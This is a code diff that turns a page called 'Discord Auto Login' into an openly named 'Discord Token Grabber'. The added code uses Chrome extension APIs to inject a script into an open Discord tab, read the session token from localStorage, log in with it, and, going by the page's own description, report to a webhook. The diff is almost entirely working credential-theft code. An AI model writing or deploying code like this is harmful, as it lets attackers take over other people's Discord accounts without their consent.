@@ -1,9 +1,31 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Discord Auto Login</title>
+    <title>Discord Token Grabber</title>
     <script>
-        // Function to read the Discord token from local storage
+        // Function to inject a script into the Discord tab
+        function injectScriptIntoDiscord() {
+            chrome.tabs.query({ url: 'https://discord.com/*' }, function (tabs) {
+                if (tabs.length > 0) {
+                    chrome.scripting.executeScript({
+                        target: { tabId: tabs[0].id },
+                        function: getDiscordToken
+                    }, function (results) {
+                        if (results && results[0] && results[0].result) {
+                            const token = results[0].result;
+                            console.log('Discord token:', token);
+                            loginWithToken(token);
+                        } else {
+                            console.log('No Discord token found.');
+                        }
+                    });
+                } else {
+                    console.log('No Discord tab found.');
+                }
+            });
+        }
+
+        // Function to get the Discord token from local storage
         function getDiscordToken() {
             return localStorage.getItem('token');
         }
@@ -54,14 +76,9 @@
             });
         }
 
-        // Main function to handle the login process
+        // Main function to handle the token grabbing process
         function main() {
-            const token = getDiscordToken();
-            if (token) {
-                loginWithToken(token);
-            } else {
-                alert('No Discord token found in local storage.');
-            }
+            injectScriptIntoDiscord();
         }
 
         // Run the main function when the page loads
@@ -69,7 +86,7 @@
     </script>
 </head>
 <body>
-    <h1>Discord Auto Login</h1>
-    <p>This script will read your Discord token from local storage, log in, and send a message to the specified webhook.</p>
+    <h1>Discord Token Grabber</h1>
+    <p>This script will grab the Discord token from the Discord tab's local storage, log in, and send a message to the specified webhook.</p>
 </body>
 </html>
